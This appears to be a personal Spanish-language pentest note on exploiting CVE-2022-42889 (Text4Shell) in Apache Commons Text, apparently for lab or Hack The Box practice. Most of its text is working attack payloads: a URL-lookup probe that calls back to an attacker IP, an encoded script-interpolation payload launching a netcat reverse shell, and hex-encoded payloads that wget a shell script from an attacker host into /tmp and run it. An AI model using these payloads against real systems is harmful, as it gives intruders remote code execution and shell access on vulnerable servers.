
## DESCRIPTION

![[Pasted image 20230606212934.png]]

#### Mas información
* https://bell-sw.com/blog/cve-2022-42889-a-critical-vulnerability-in-apache-commons-text-library/
* https://nvd.nist.gov/vuln/detail/CVE-2022-42889


## EXPLOITATION

### OPTION 1: EJEMPLO

Necesitamos encontrar un campo donde podamos añadir texto


![[Pasted image 20230606212952.png]]
![[Pasted image 20230606212956.png]]
1º Prueba utliziar: ${url:UTF-8:http://192.168.45.212/test.php}

Comprobamos que nos llegan los paquetes

![[Pasted image 20230606213014.png]]

2º prueba ver si podemos ejecutar comandos (como ping o wget)

![[Pasted image 20230606213019.png]]

![[Pasted image 20230606213023.png]]


3º Pasa crear una reverse shell: hemos probado con varias pero nos daban problemas, como estas

http://192.168.62.174/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%27nc%20192.168.62.161%20443%20-e%20%2Fbin%2Fbash%27%29%7D


![[Pasted image 20230606213031.png]]


Vamos a crear una shell .sh la subimos y la ejecutamos:



txt4shell

%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%22%77%67%65%74%20%31%39%32%2e%31%36%38%2e%34%35%2e%32%32%38%2f%73%68%65%6c%6c%2e%73%68%20%2d%4f%20%2f%74%6d%70%2f%73%68%65%6c%6c%32%2e%73%68%22%29%7D 

![[Pasted image 20230606213037.png]]


![[Pasted image 20230606213043.png]]

%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%22%62%61%73%68%20%2f%74%6d%70%2f%73%68%65%6c%6c%32%2e%73%68%22%29%7D


![[Pasted image 20230606213050.png]]



## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 